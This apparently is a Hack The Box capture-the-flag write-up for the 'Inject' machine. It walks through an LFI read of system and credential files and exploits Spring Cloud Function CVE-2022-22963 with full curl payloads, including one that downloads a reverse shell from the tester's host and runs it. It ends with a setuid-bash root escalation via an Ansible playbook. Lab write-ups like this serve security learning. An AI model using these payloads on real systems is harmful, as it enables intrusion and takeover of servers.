## Enumeration

### nmap

We've only got two ports open, `22` and `8080`. We likely won't find anything with port 22 so let's head over to 8080 in a broswer.

We've got a website, many of the links don't do anything. However, it looks like there may be a site under construction (maybe a subdomain??) We also have an upload page that will only accept images. If we upload an image, it looks like there is an LFI vulnerability in the URL.

```
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```
We are able to see files and the directory in burp by just going to the URL. In `/home/frank` we find a folder names `/.m2` that has a `settings.xml` file that contains credentials.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">

    <server>
      <id>Inject</id>
      <username>phil</username>

      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```
After some more searching we find that it is running a vulnerable version of `Spring Cloud` (3.2.2). There is an exploit [here](https://github.com/me2nuk/CVE-2022-22963) All we have to do is run the curl request found of the site with the Inject IP address and port.

```shell
┌──(dimondsec㉿hackbook)-[~/Documents/HTB/inject]
└─$ curl -X POST  http://10.129.35.51:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v 
docker exec -it --user=root vuln ls /tmp
```
This creates a new file at `/tmp/pwned`. We check using the LFI discovered earlier and it is there! Let's now create a basic reverse shell file on our Kali box, use `wget` in our exploit above to download the shell to `/tmp` on Inject, set up a netcat listener, then use our exploit to run the reverse shell with bash.

```shell
┌──(dimondsec㉿hackbook)-[~/Documents/HTB/inject/www]
└─$ curl -X POST  http://10.129.35.51:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget http://10.10.14.66/revshell.sh -O /tmp/revshell.sh")' --data-raw 'data' -v
docker exec -it --user=root vuln ls /tmp
```
```shell
┌──(dimondsec㉿hackbook)-[~/Documents/HTB/inject/www]
└─$ curl -X POST  http://10.129.35.51:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash -i /tmp/revshell.sh")' --data-raw 'data' -v
docker exec -it --user=root vuln ls /tmp
```
Now we have a shell with `frank`! From our enumeration earlier, we know that `user.txt` is owned by `phil`, and we already have his password from a file we found a while ago. So `su` to phil and we have our flag.

I uploaded `pspy` and noticed that there is something being run called Ansible Playbook. It is running and using any `.py` file in the directory `/opt/automations/tasks` directory. After some googling, it looks like we can create a new `.yml` file in that directory with the following to set UID to `/bin/bash` and give us root.

```yml
- name: "whatever"
  hosts: localhost
  connection: local
  tasks:
    - name: "whatever"
      shell: "chmod +s /bin/bash"
      register: "output"
```
Once it's created we just have to wait a couple of minutes, run `bash -p` and boom, we're root.
